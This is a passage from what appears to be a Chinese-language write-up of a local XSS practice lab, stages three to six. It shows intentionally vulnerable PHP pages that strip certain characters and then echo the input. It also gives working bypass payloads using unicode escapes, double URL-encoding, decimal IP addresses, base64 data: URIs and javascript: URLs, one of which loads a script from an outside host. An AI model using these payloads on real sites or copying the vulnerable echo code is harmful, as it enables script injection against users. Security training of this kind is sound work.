url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-2.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">xxx%22%3E%3Cscript%3EsetTimeout</span></span></span>`\u0065\u0076\u0061\u006c\u0028\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u002e\u0068\u0061\u0073\u0068\u002e\u0073\u006c\u0069\u0063\u0065\u0028\u0031\u0029\u0029`;%3C/script%3E<span class="token fragment"><span class="token fragment-delimiter">#</span>with(document)body.appendChild(createElement('script')).src='http://xcao.vip/xss/alert.js'</span></pre></td></tr></table></figure><ol><li>这样通过 <code>setTimeout</code> 以及用 <code>反引号</code> 代替 <code>()</code> ，同时采用 <code>unicode编码</code> 绕过对 <code>()</code> 和 <code>.</code> 的限制</li><li><code>setTimeout()</code> 是属于 window 方法，该方法用于在指定的毫秒数后调用函数或计算表达式（这里缺少了时间的参数，不需要等待，直接执行）</li><li>中间的 unicode 编码的内容和之前的 eval (location.hash.slice (1))，总体上思路和第一式方法二差不多</li></ol><h2 id="第三式"><a class="anchor" href="#第三式">#</a> 第三式</h2><p>过滤了 <code>&amp; # \，</code> 放开了 <code>=</code></p><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    $data=$_GET['data'];</pre></td></tr><tr><td data-num="3"></td><td><pre>    $data = str_replace("(","",$data);</pre></td></tr><tr><td data-num="4"></td><td><pre>    $data = str_replace(")","",$data);</pre></td></tr><tr><td data-num="5"></td><td><pre>    $data = str_replace(".","",$data);</pre></td></tr><tr><td data-num="6"></td><td><pre>    $data = str_replace("&amp;","",$data);</pre></td></tr><tr><td data-num="7"></td><td><pre>    $data = str_replace("#","",$data);</pre></td></tr><tr><td data-num="8"></td><td><pre>    $data = str_replace("\\","",$data);</pre></td></tr><tr><td data-num="9"></td><td><pre>?></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第三式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第三式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 ().&amp;#\，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?php echo $data;?><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="url编码"><a class="anchor" href="#url编码">#</a> url 编码</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-3.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">%22%3E%3Cscript%20src=%22http://127%252e0%252e0%252e1/mpy-web/xss/alert%252ejs%22%3E%3C/script%3E</span></span></span></pre></td></tr></table></figure><p>因为过滤了 &amp; 和 #，所以 html 和 unicode 编码都不能使用，但是放开了 =，可以对。进行 url 编码绕过后端检测 .=&gt; %252e（%25 就是 %，%2e 就是.）</p><h3 id="php302重定向"><a class="anchor" href="#php302重定向">#</a> PHP302 重定向</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-3.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">%22%3E%3Cscript%20src=%22http://2130706433%22%3E%3C/script%3E</span></span></span></pre></td></tr></table></figure><p>利用 PHP 的 302 重定向，在本地写一个 PHP 文件</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: http://127.0.0.1/mpy-web/xss/alert.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></pre></td></tr></table></figure><ol><li>也就是当访问这个 PHP 文件时，会调到指定的页面去</li><li>然后就在 payload 中加载自己的本地 IP 地址，但是需要自己的本地 web 服务器网站首页修改成这个 PHP 文件</li><li>IP 地址中的。会遭到题目的过滤，这时又会用到一种方法 =&gt; IP 地址转换十进制形式</li></ol><h2 id="第四式"><a class="anchor" href="#第四式">#</a> 第四式</h2><p>过滤了 <code>= ( ) . &amp; # \</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第四式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第四式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 =().&amp;#\，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="iframe内嵌"><a class="anchor" href="#iframe内嵌">#</a> iframe 内嵌</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-4.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=</span></span>">&lt;iframe>&lt;/iframe>&lt;script>frames[0]['location']['replace']`data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`&lt;/script></pre></td></tr></table></figure><ol><li>首先是标签，它是一个内联框架，被用来当前 HTML 文档中嵌入另一个文档（在一个网页中嵌入另一个网页）</li><li>可以通过 src 指定 URL，但是 = 被过滤了，这时用到了 frames [0].location.replace ()</li><li>frames 这个属性返回窗口中所有命名的框架，也就是说，这个属性会返回当前页面中所有的 iframe 框架，是一个类似属组的形式</li><li>这里选择下标为 0 的框架，也就是第一个即我们自己构造的标签</li><li>然后，location 获取标签的 URL，location.replace (url) 通过加载 URL 指定的文档来替换当前文档，也就是替换当前窗口页面</li><li>之后就是重要的 data 协议，text/html 指定了数据格式，base64 指定了编码类型，在这之后，我们需要写入替换的代码，因为要加载目标代码，还是用之前的</li></ol><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://127.0.0.1/mpy-web/xss/alert.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></pre></td></tr></table></figure><p>将这个语句进行 base64 加密得到 <code>PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg</code></p><h3 id="locationreplace"><a class="anchor" href="#locationreplace">#</a> location['replace']</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-4.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=</span></span>">&lt;script>location['replace']`javascript:eval%2528eval%2528location%252ehash%252eslice%25281%2529%2529%2529`&lt;/script><span class="token fragment"><span class="token fragment-delimiter">#</span>with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</span></pre></td></tr></table></figure><ol><li>使用了 <code>location['replace']</code> 的做法</li></ol><blockquote><p>JavaScript 伪协议</p><ol><li>伪协议不同于 HTTP、FTP 这类标准化协议，它是一种非标准化的协议，主要应用于关联应用程序，较为特殊</li><li>比如有的场景会使用 tencent:// 来关联 QQ</li><li>在 JavaScript 使用伪协议需要进行声明 <code>javascript:alert(&quot;hello world&quot;)</code></li></ol></blockquote><ol start="2"><li>这个特殊的协议类型声明了其主体是 JavaScript 代码，由 JavaScript 的解释器运行，如果代码中有多个句子，需要使用；隔开</li><li>使用了伪协议之后，再次使用了 eval (eval (location.hash.slice (1)))，其中 eval (location.hash.slice (1)) 得到了</li></ol><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>with(document)body,appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</pre></td></tr></table></figure><p>这一部分，然后再讲这一部分执行，从而添加了 <code>&lt;script&gt;</code> 标签</p><p>将 <code>eval(eval(location.hash.slice(1)))</code> 进行 URL 编码过后，仍需要对 % 进行二次编码</p><h2 id="第五式"><a class="anchor" href="#第五式">#</a> 第五式</h2><p>过滤了 <code>( ) . &amp; # \ %</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第无式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第五式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 ().&amp;#\%，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="数字ip"><a class="anchor" href="#数字ip">#</a> 数字 IP</h3><p>发现过滤了 %，URL 编码也不可以了，但是数字 IP 貌似可以</p><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-5.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">%22%3E%3Cscript%20src=%22http://2130706433%22%3E%3C/script%3E</span></span></span></pre></td></tr></table></figure><h3 id="base64编码"><a class="anchor" href="#base64编码">#</a> base64 编码</h3><p>虽然过滤了 %，但是前面的 base64 编码仍旧可以使用</p><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-5.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=</span></span>">&lt;iframe>&lt;/iframe>&lt;script>frames[0]['location']['replace']`data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`&lt;/script></pre></td></tr></table></figure><h2 id="第六式"><a class="anchor" href="#第六式">#</a> 第六式</h2><p>过滤了 <code>= ( ) . &amp; # \ %</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token 